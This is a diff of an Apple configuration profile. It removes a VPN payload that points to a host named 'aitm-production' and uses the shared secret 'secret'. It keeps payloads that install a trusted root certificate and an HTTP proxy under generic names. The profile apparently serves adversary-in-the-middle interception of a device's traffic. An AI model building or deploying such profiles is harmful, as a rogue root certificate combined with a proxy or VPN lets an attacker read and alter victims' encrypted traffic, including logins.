@@ -6,43 +6,13 @@
     <array>
         <dict>
             <key>PayloadType</key>
-            <string>com.apple.vpn.managed</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>PayloadIdentifier</key>
-            <string>com.security.vpn.00000000-0000-0000-0000-000000000001</string>
-            <key>PayloadUUID</key>
-            <string>00000000-0000-0000-0000-000000000001</string>
-            <key>PayloadDisplayName</key>
-            <string>VPN</string>
-            <key>UserDefinedName</key>
-            <string>VPN</string>
-            <key>VPNType</key>
-            <string>IPSec</string>
-            <key>RemoteAddress</key>
-            <string>aitm-production.up.railway.app</string>
-            <key>AuthenticationMethod</key>
-            <string>SharedSecret</string>
-            <key>SharedSecret</key>
-            <string>secret</string>
-            <key>localIdentifier</key>
-            <string>user</string>
-            <key>remoteIdentifier</key>
-            <string>server</string>
-            <key>XAuthEnabled</key>
-            <integer>0</integer>
-            <key>PromptForVPNPIN</key>
-            <false/>
-        </dict>
-        <dict>
-            <key>PayloadType</key>
             <string>com.apple.security.root</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
             <key>PayloadIdentifier</key>
             <string>com.security.cert</string>
             <key>PayloadUUID</key>
-            <string>00000000-0000-0000-0000-000000000002</string>
+            <string>00000000-0000-0000-0000-000000000001</string>
             <key>PayloadDisplayName</key>
             <string>Certificate</string>
             <key>PayloadCertificateFileName</key>
@@ -79,7 +49,7 @@ VlZXM1RRM1U9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
             <key>PayloadIdentifier</key>
             <string>com.security.proxy</string>
             <key>PayloadUUID</key>
-            <string>00000000-0000-0000-0000-000000000003</string>
+            <string>00000000-0000-0000-0000-000000000002</string>
             <key>PayloadDisplayName</key>
             <string>Proxy</string>
             <key>HTTPProxy</key>
@@ -103,7 +73,7 @@ VlZXM1RRM1U9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>00000000-0000-0000-0000-000000000004</string>
+    <string>00000000-0000-0000-0000-000000000003</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
     <key>PayloadDescription</key>
